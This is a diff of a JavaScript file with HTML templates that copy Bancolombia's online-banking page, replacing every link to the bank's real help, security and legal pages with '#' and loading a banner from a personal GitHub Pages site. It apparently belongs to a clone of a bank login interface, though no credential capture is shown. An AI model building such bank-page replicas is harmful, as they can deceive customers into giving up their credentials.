@@ -151,7 +151,7 @@ let options = `
                                 <div class="panel_general mua-panel_general">
                                     <div id="contenido">
                                         <div class="mua-divIcon">
-                                            <a class="mua-itemsIcons-btn" href="https://www.bancolombia.com/centro-de-ayuda/canales/sucursal-virtual-personas" target="_blank">
+                                            <a class="mua-itemsIcons-btn" href="#" target="_blank">
                                                 <div class="mua-divCell">
                                                     <span class="adminItems-Icons icon-icon_demo">
                                                         <span class="path1"></span><span class="path2"></span><span class="path3"></span><span class="path4"></span><span class="path5"></span><span class="path6"></span><span class="path7"></span>
@@ -164,7 +164,7 @@ let options = `
                                         </div>
 
                                         <div class="mua-divIcon">
-                                            <a class="mua-itemsIcons-btn" href="https://www.bancolombia.com/educacion-financiera/seguridad-bancaria/seguridad-informatica" target="_blank">
+                                            <a class="mua-itemsIcons-btn" href="#" target="_blank">
                                                 <div class="mua-divCell">
                                                     <span class="adminItems-Icons icon-icon_bloquear">
                                                         <span class="path1"></span><span class="path2"></span>
@@ -177,7 +177,7 @@ let options = `
                                         </div>
 
                                         <div class="mua-divIcon">
-                                            <a class="mua-itemsIcons-btn" href="https://www.bancolombia.com/wcm/connect/www.grupobancolombia.com15880/cdd7ef14-0302-4906-8913-9313b98e060e/REGLAMENTO+BANCA+POR+INTERNET+a+partir+salida+OTP+06+junio.pdf?MOD=AJPERES&amp;CVID=m82iJ3m" target="_blank">
+                                            <a class="mua-itemsIcons-btn" href="#" target="_blank">
                                                 <div class="mua-divCell">
                                                     <span class="adminItems-Icons icon-icon_reglamento">
                                                         <span class="path1"></span><span class="path2"></span><span class="path3"></span><span class="path4"></span><span class="path5"></span><span class="path6"></span><span class="path7"></span>
@@ -190,7 +190,7 @@ let options = `
                                         </div>
 
                                         <div class="mua-divIcon">
-                                            <a class="mua-itemsIcons-btn" href="https://www.bancolombia.com/personas/documentos-legales/proteccion-datos/bancolombia-sa" target="_blank">
+                                            <a class="mua-itemsIcons-btn" href="#" target="_blank">
                                                 <div class="mua-divCell">
                                                     <span class="adminItems-Icons icon-icon_politicas">
                                                         <span class="path1"></span><span class="path2"></span><span class="path3"></span><span class="path4"></span><span class="path5"></span>
@@ -212,7 +212,7 @@ let ads = `
                                 <img class="imgAds" src="https://itsmariodev.github.io/img/clave.jpg" frameborder="0" scrolling="no" width="635px" height="335px">
                                 </div>
 
-                                <p class="text-center">¿No conoces la Sucursal Virtual Personas de Bancolombia?&nbsp; Conoce más <a href="https://www.bancolombia.com/centro-de-ayuda/canales/sucursal-virtual-personas" target="_blank" class="a1">aquí</a></p>
+                                <p class="text-center">¿No conoces la Sucursal Virtual Personas de Bancolombia?&nbsp; Conoce más <a href="#" target="_blank" class="a1">aquí</a></p>
                             </div>
 `
 
